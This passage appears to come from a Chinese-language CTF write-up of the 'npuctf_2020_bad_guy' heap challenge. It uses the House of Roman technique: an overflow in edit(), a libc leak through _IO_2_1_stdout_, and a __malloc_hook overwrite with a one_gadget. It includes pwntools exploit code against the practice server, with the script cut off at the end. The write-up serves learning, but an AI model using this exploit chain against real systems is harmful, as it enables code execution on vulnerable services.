class=\"headerlink\" title=\"edit\"></a>edit</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">edit</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 nbytes; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( count &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  --count;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  nbytes = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>), nbytes);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><font color=\"red\">这里是漏洞点,可以读入任意的大小</font></p>\n<p>alarm 把值给改了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; ni</span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGALRM, Alarm clock.</span><br><span class=\"line\"><span class=\"number\">0x0000555555400ced</span> in <span class=\"title function_\">add</span> <span class=\"params\">()</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────</span><br><span class=\"line\">*RAX  0<span class=\"title function_\">x555555602040</span> <span class=\"params\">(heaparray)</span> ◂— 0x0</span><br><span class=\"line\"> RBX  0x0</span><br><span class=\"line\">*RCX  0<span class=\"title function_\">x555555400ced</span> <span class=\"params\">(add+<span class=\"number\">92</span>)</span> ◂— mov rdx, qword ptr [rbp - 0x10]</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">prog_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>开了pie,应该先想办法泄漏地址,然后用onegadget覆盖malloc_hook等即可</p>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>​\t利用io stdout进行泄漏、(前期方便调试可以本地先关闭alsr)</p>\n<p>​\t具体来说,要构造堆块重叠(<strong>类似double free感觉?如果不够造但是可以直接修改地址吗不是</strong>), 修改_IO_2_1_stdout _的flags值(原理在最后) ,然后就可以泄露地址了</p>\n<p>​\t构造四个堆块,free掉0x60的2号,然后利用edit的漏洞把1大小改为0x90,然后释放,然后通过malloc一个0x10大小堆块,使得剩余的堆块与释放的2号堆块重叠</p>\n<p>​\t<font color=\"red\">重叠的目的是把unsortedbin的fd的地址放到fastbin地址那里,让fastbin能利用这个地址进行申请</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">2</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   free(<span class=\"number\">2</span>)</span><br><span class=\"line\">   payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)<span class=\"comment\"># + p64(0) * 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   free(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   malloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t没有malloc 0x10前,可以看到fastbin的位置,以及它的fd是没有值的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_15-52-48.jpg\" alt=\"Snipaste_2023-10-25_15-52-48\"></p>\n<p>​\tmalloc后</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-13-46.jpg\" alt=\"Snipaste_2023-10-25_16-13-46\"></p>\n<p>​\t将后四字节修改为0x255，然后malloc两次就可以分到_IO_2_1_stdout _上面的位置,之所以要分配0x25dd那里,是因为要满足堆的大小检查要求</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p16(<span class=\"number\">0x25dd</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   malloc(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   payload = <span class=\"number\">0x33</span> * p8(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xfbad800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p8(<span class=\"number\">0</span>)</span><br><span class=\"line\">   malloc(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-17-59.jpg\" alt=\"Snipaste_2023-10-25_16-17-59\"></p>\n<p>​\t不满足要求的话会报错 <strong>Error in &#96;.&#x2F;npuctf_2020_bad_guy’: malloc(): memory corruption (fast): 0x00007ffff7dd25f5</strong> ,这一块等分析源码的时候再细看</p>\n<p>​\tmalloc完之后,_IO_2_1_stdout的flags就被修改了， 也就是要修改对应flag的值 和 _IO_write_base, _IO_write_ptr, _IO_write_end等 就会自动输出缓存区的信息??????</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-20-04.jpg\" alt=\"Snipaste_2023-10-25_16-20-04\"></p>\n<p>​\t然后就会泄露libc地址了,泄漏的地址是多少呢,是0x7ffff7dd2600,<font color=\"red\">为啥呢?</font>,减去偏移就得到了基址</p>\n<p> payload &#x3D; 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)</p>\n<p>(0x33 &#x3D; 51  &#x3D; 6*8 + 3)   + 2  *  8 +1    &#x3D; 8 * 8 + 4</p>\n<p>从 0xed那里开始输入数据, 0x33 * p8(0)  &#x3D; 51, 而0x2620-0x25ed正好是51</p>\n<h3 id=\"故伎重演-替换malloc-hook为onegadget\"><a href=\"#故伎重演-替换malloc-hook为onegadget\" class=\"headerlink\" title=\"故伎重演,替换malloc_hook为onegadget\"></a>故伎重演,替换malloc_hook为onegadget</h3><p>​\t此时堆的布局的话,还有一个0x60大小的unsortedbin, 分了再free放进fastbin, 此时有地址了,就不需要那么麻烦再利用unsortedbin的地址了,直接edit修改就可以了,然后两次malloc把__malloc_hook那里改为onegadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">7</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   <span class=\"comment\">#pause()</span></span><br><span class=\"line\">   free(<span class=\"number\">7</span>)</span><br><span class=\"line\">   payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p64(libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x23</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">   edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">   malloc(<span class=\"number\">8</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">   payload = <span class=\"number\">0x13</span> * p8(<span class=\"number\">0</span>) + p64(libc.offset_to_vaddr(one[<span class=\"number\">3</span>]))</span><br><span class=\"line\">   malloc(<span class=\"number\">9</span>,<span class=\"number\">0x60</span>,payload)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"如何开启了alsr-如何爆破呢\"><a href=\"#如何开启了alsr-如何爆破呢\" class=\"headerlink\" title=\"如何开启了alsr 如何爆破呢\"></a>如何开启了alsr 如何爆破呢</h3><p>​\t学到了, 这样获取错误, 以前自己写循环tryexcept这里一直有问题,回头可以试试用这里的是否可以</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pwn()</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#p = process(binary)</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> :</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"comment\">#p = process(binary)</span></span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?</strong></p>\n<h2 id=\"一些细节\"><a href=\"#一些细节\" class=\"headerlink\" title=\"一些细节\"></a>一些细节</h2><h3 id=\"libc的版本\"><a href=\"#libc的版本\" class=\"headerlink\" title=\"libc的版本\"></a>libc的版本</h3><p>​\t做题的话注意一下版本,buuctf用的是2.23-0ubuntu11_amd64,这个版本我在网上没找到,找到的没符号,自己编译的还报错(用ubuntu20编译的,不知道16是不是可以)</p>\n<p>​\t不同版本偏移不一样</p>\n<p>​\t但是那个2.23- 多少是一样的</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><p>用的这位师傅的: <a href=\"https://blog.csdn.net/csdn546229768/article/details/123717993\">https://blog.csdn.net/csdn546229768/article/details/123717993</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import sys</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">SigreturnFrame(kernel = <span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binary = <span class=\"string\">&quot;./npuctf_2020_bad_guy&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">one = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]  <span class=\"comment\">#2.23-0ubuntu11.3</span></span><br><span class=\"line\"><span class=\"comment\">#one = [0x45216,0x4526a,0xf02a4,0xf1147] # buuctf</span></span><br><span class=\"line\"><span class=\"comment\">#idx = int(sys.argv[1])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">global</span> p</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(binary)</span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">    e = ELF(binary)</span><br><span class=\"line\">    libc = e.libc</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"string\">&quot;27593&quot;</span>)</span><br><span class=\"line\">    e = ELF(binary)</span><br><span class=\"line\">    <span class=\"comment\">#libc = e.libc</span></span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./libc-2.23.buu.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ Condfig ############################################</span></span><br><span class=\"line\">sd = <span class=\"keyword\">lambda</span> s:p.send(s)</span><br><span class=\"line\">sl = <span class=\"keyword\">lambda</span> s:p.sendline(s)</span><br><span class=\"line\">rc = <span class=\"keyword\">lambda</span> s:p.recv(s)</span><br><span class=\"line\">ru = <span class=\"keyword\">lambda</span> s:p.recvuntil(s)</span><br><span class=\"line\">sa = <span class=\"keyword\">lambda</span> a,s:p.sendafter(a,s)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class=\"line\">it = <span class=\"keyword\">lambda</span> :p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">z</span>(<span class=\"params\">s=<span class=\"string\">&#x27;b main&#x27;</span></span>):</span><br><span class=\"line\">    gdb.attach(p,s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">logs</span>(<span class=\"params\">mallocr,string=<span class=\"string\">&#x27;logs&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">isinstance</span>(mallocr,<span class=\"built_in\">int</span>)):</span><br><span class=\"line\">       <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[1;31;40m%20s--&gt;0x%x\\033[0m&#x27;</span>%(string,mallocr))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">       <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[1;31;40m%20s--&gt;%s\\033[0m&#x27;</span>%(string,mallocr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pa</span>(<span class=\"params\">s=<span class=\"string\">&#x27;1&#x27;</span></span>):</span><br><span class=\"line\">    log.success(<span class=\"string\">&#x27;pause : step---&gt; &#x27;</span>+<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">info</span>(<span class=\"params\">data,key=<span class=\"string\">&#x27;info&#x27;</span>,bit=<span class=\"number\">64</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(bit == <span class=\"number\">64</span>):</span><br><span class=\"line\">      leak = u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      leak = u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    logs(leak,key)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> leak</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ Function ############################################</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">i,s,c = <span class=\"string\">&#x27;A&#x27;</span></span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;Content:&#x27;</span>,c)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">i,s,c = <span class=\"string\">&#x27;A&#x27;</span></span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(s))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;content:&#x27;</span>,c)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"comment\">################################### Statr ############################################</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    malloc(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">2</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    free(<span class=\"number\">2</span>)</span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)<span class=\"comment\"># + p64(0) * 3 + p64(0x91)</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    malloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p16(<span class=\"number\">0x25dd</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">5</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    payload = <span class=\"number\">0x33</span> * p8(<span class=\"number\">1</span>) + p64(<span class=\"number\">0xfbad800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p8(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\">    <span class=\"comment\">#pa()</span></span><br><span class=\"line\">    <span class=\"comment\">#libc.address = info(ru(&#x27;\\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)</span></span><br><span class=\"line\">    <span class=\"comment\">#libc.address = info(ru(&#x27;\\x7f&#x27;)[-6:])</span></span><br><span class=\"line\">    <span class=\"comment\">#print(hex(libc.address))</span></span><br><span class=\"line\">    libc.address = info(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:]) - (<span class=\"number\">0x7ffff7dd2600</span> - <span class=\"number\">0x7ffff7a0d000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc.address))</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    malloc(<span class=\"number\">7</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    free(<span class=\"number\">7</span>)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x71</span>) + p64(libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x23</span>) <span class=\"comment\">#* 3 + p64(0x91)</span></span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">    malloc(<span class=\"number\">8</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\">    payload = <span class=\"number\">0x13</span> * p8(<span class=\"number\">0</span>) + p64(libc.offset_to_vaddr(one[<span class=\"number\">3</span>]))</span><br><span class=\"line\">    malloc(<span class=\"number\">9</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\">    <span class=\"comment\">#pause()</span></span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Index :&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\">    sla(<span 